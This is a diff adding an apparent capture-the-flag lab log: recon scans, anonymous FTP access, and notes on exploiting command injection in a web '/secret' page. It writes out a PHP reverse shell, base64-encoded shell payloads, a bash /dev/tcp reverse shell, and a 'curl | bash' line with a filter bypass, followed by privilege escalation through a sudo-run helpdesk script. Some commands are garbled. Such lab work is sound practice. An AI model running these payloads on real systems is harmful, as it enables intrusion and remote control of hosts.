@@ -1,0 +1,234 @@
+root@ip-10-10-254-178:~# nmap -sC -sV -O -T 4 -O -p- 10.10.34.29 
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-19 20:04 GMT
+Nmap scan report for ip-10-10-34-29.eu-west-1.compute.internal (10.10.34.29)
+Host is up (0.00049s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.254.178
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Game Info
+MAC Address: 02:BE:D6:25:B5:E3 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/19%OT=21%CT=1%CU=43942%PV=Y%DS=1%DC=D%G=Y%M=02BED6%T
+OS:M=61E873BA%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)
+OS:SEQ(SP=FA%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301
+OS:ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WI
+OS:N(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F5
+OS:07%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
+OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
+OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1282.10 seconds
+
+
+root@ip-10-10-254-178:~# nikto -h 10.10.34.29
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.34.29
++ Target Hostname:    ip-10-10-34-29.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-01-19 20:33:29 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x8970 0x56d7e303a7e80 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ IP address found in the 'location' header. The IP is "127.0.1.1".
++ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-01-19 20:33:39 (GMT0) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+root@ip-10-10-254-178:~# gobuster dir -u http://10.10.34.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.34.29/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/19 20:34:31 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/secret (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/01/19 20:34:54 Finished
+===============================================================
+
+root@ip-10-10-254-178:~# gobuster dir -u http://10.10.34.29/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.34.29/secret
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/19 20:36:37 Starting gobuster
+===============================================================
+/images (Status: 301)
+===============================================================
+2022/01/19 20:37:02 Finished
+===============================================================
+root@ip-10-10-254-178:~# gobuster dir -u http://10.10.34.29/secret/images -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.34.29/secret/images
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/19 20:38:08 Starting gobuster
+===============================================================
+===============================================================
+2022/01/19 20:38:33 Finished
+==============================================================
+root@ip-10-10-254-178:~# ftp 10.10.34.29
+Connected to 10.10.34.29.
+220 (vsFTPd 3.0.3)
+Name (10.10.34.29:root): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+226 Directory send OK.
+ftp> get note.txt
+local: note.txt remote: note.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (90 bytes).
+226 Transfer complete.
+90 bytes received in 0.00 secs (43.4242 kB/s)
+ftp> cd ..
+250 Directory successfully changed.
+ftp> sl
+?Invalid command
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+226 Directory send OK.
+
+root@ip-10-10-254-178:~# cat note.txt 
+Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+
+
+Command injection vulnerablity of /secret
+Going for the juggular a php reverse shell:
+php -r 'sock=fsockopen("10.10.250.178",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+echo "cGhwIC1yICdzb2NrPWZzb2Nrb3BlbigiMTAuMTAuMjU0LjE3OCIsMTIzNCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIoI+JjMiKTsn" | base64 -d 1> exec;
+
+Although my brain working hard to bypass the filter, review the writeup from 
+stormbreaker101, '/' can be used to escape many commands. So my echo would work but
+base64 did not, even with filtering.
+Although echo and pwd, long story short you can't write to /secret so
+/var/www/html/secret
+just write to /tmp
+
+echo "cGhwIC1yICdzb2NrPWZzb2Nrb3BlbigiMTAuMTAuMTM4LjE3MiIsMTIzNCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn" > base64 -d >> /tmp/f
+
+chmod +x /tmp/f 
+
+total 8 drwxrwxrwt 2 root root 4096 Jan 20 17:24 . drwxr-xr-x 24 root root 4096 Oct 3 2020 .. -rwxr-xr-x 1 www-data www-data 0 Jan 20 17:24 f
+
+tac /tmp/f did nothing.
+So went back to the stormbreak101 writeup, uploading with curl
+CURL if anyone reads multiples of these seems like my continual downfall as blindspot.
+shell.sh contents:
+bash -c "bash -i >& /dev/tcp/10.10.138.172/1234 0>&1"
+
+curl http://10.10.138.172:4444/shell.sh | ba\sh
+
+www-data@ubuntu:/home/apaar$ ls -la
+total 44
+drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
+drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
+-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
+-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
+-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
+drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
+drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
+-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
+-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
+drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
+-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
+-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
+
+
+www-data@ubuntu:/home/apaar$ cat .helpline.sh 
+#!/bin/bash
+
+echo
+echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
+echo
+
+read -p "Enter the person whom you want to talk with: " person
+
+read -p "Hello user! I am $person,  Please enter your message: " msg
+
+$msg 2>/dev/null
+
+ECHO "tHANK YOU FOR YOUR PRECIOUS TIME!"
+
+sudo -u apaar apaar/.helpline.sh
+
+As input enter some funny for the first field and then /bin/bash.
+
+
+
+
